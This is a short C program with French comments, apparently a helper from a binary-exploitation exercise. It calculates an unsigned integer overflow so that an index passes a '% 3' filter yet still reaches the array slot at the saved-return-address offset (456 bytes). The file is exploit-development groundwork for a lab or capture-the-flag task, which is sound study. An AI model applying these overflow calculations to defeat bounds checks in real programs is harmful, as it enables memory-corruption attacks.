#include <stdio.h>
#include <limits.h>

// il faut overflow *(uint *)(index_input * 4 + tab) => tab[index_input * 4] pour reussir à avoir tab[114]
// donc index_input * 4 doit être égale à 456
// donc index_input = 456 / 4 = 114 mais on ne peut pas utilisé 114 car % 3 == 0 => only for will
// donc il va falloir arrivé au même index sans l'écrire explicitement d'ou l'overflow
// on peut commencer avec UINT_MAX comme input
// on arrive à UINT_MAX * 4 doit etre égale à 456


int main() {
	int index = 114;

	int eip_offset = 456;

	unsigned int tab = 4294956324;

	 
	printf("index => %d\n\n", index);

	printf("eip_offset => %d\n\n", eip_offset);
	
	printf("UINT_MAX OVERFLOW => %d (%x)\n\n", UINT_MAX, UINT_MAX);
	
	printf("1 -> UINT_MAX / 2 ** => %d\n\n", UINT_MAX / 2); //
	
	printf("2 -> index + (UINT_MAX / 2) + 1 ** => %d\n\n", index + UINT_MAX / 2 + 1);
	
	printf("3 -> (index + UINT_MAX / 2 + 1) * 4 => %d\n\n", (index + UINT_MAX/2 + 1) * 4);
	
	printf("4 -> (index + UINT_MAX / 2 + 1) * 4 / 4 => %d\n\n", (index + UINT_MAX/2 + 1) * 4 / 4);

}